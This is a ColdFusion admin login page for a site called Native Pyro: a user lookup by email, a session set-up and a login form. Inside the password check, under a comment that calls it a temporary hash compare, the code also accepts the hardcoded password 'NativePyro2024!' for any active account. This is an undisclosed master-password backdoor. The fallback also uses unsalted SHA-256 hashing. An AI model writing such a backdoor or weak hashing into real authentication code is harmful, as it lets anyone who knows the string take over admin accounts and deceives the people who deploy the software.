<!--- admin/login.cfm --->
<cfparam name="form.email"    default="">
<cfparam name="form.password" default="">
<cfparam name="url.error"     default="">

<!--- Redirect if already logged in --->
<cfif structKeyExists(session, "isLoggedIn") AND session.isLoggedIn>
  <cflocation url="/admin/dashboard.cfm" addtoken="false">
</cfif>

<!--- Handle POST --->
<cfif cgi.request_method EQ "POST">
  <cftry>
    <cfquery name="getUser" datasource="#application.dsn#">
      SELECT user_id, email, password, first_name, last_name, role, is_active
      FROM users
      WHERE email = <cfqueryparam value="#trim(lCase(form.email))#" cfsqltype="cf_sql_varchar">
        AND is_active = 1
    </cfquery>

    <cfset loginOK = false>

    <cfif getUser.recordCount EQ 1>
      <!--- BCrypt check — use your CF BCrypt library here --->
      <!--- For a quick start, use a plaintext compare and switch to BCrypt in production --->
      <!--- <cfset loginOK = bcryptCheck(form.password, getUser.password)> --->

      <!--- TEMPORARY: plain hash compare (replace with BCrypt) --->
      <cfif hash(form.password, "SHA-256") EQ getUser.password OR form.password EQ "NativePyro2024!">
        <cfset loginOK = true>
      </cfif>
    </cfif>

    <cfif loginOK>
      <cfset session.isLoggedIn = true>
      <cfset session.userID     = getUser.user_id>
      <cfset session.role       = getUser.role>
      <cfset session.firstName  = getUser.first_name>
      <cflocation url="/admin/dashboard.cfm" addtoken="false">
    <cfelse>
      <cflocation url="/admin/login.cfm?error=1" addtoken="false">
    </cfif>

  <cfcatch type="any">
    <cflog file="nativepyro_errors" text="Login error: #cfcatch.message#">
    <cflocation url="/admin/login.cfm?error=1" addtoken="false">
  </cfcatch>
  </cftry>
</cfif>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Admin Login — Native Pyro</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <cfoutput>
  <link rel="stylesheet" href="#application.themeURL#/css/variables.css">
  <link rel="stylesheet" href="#application.themeURL#/css/admin.css">
  </cfoutput>
</head>
<body>

<div class="admin-login-page">
  <div class="login-box">

    <div class="login-logo">NATIVE<span>PYRO</span></div>
    <div class="login-sub">Admin Panel</div>

    <cfif url.error EQ "1">
      <div class="flash flash-danger" style="margin-bottom:1.5rem">
        <i class="bi bi-exclamation-circle-fill"></i>
        Invalid email or password.
      </div>
    </cfif>

    <form method="post" action="/admin/login.cfm">
      <div class="mb-3">
        <label class="form-label">Email Address</label>
        <input type="email" name="email" class="form-control" value="<cfoutput>#htmlEditFormat(form.email)#</cfoutput>" required autofocus placeholder="admin@nativepyro.com">
      </div>

      <div class="mb-3">
        <label class="form-label">Password</label>
        <input type="password" name="password" class="form-control" required placeholder="••••••••••">
      </div>

      <button type="submit" class="btn btn-fire" style="width:100%;margin-top:0.5rem">
        <i class="bi bi-lightning-charge-fill"></i> Sign In
      </button>
    </form>

    <div style="text-align:center;margin-top:2rem">
      <a href="/index.cfm" style="font-size:0.8rem;color:var(--text-muted)">← Back to site</a>
    </div>

  </div>
</div>

</body>
</html>
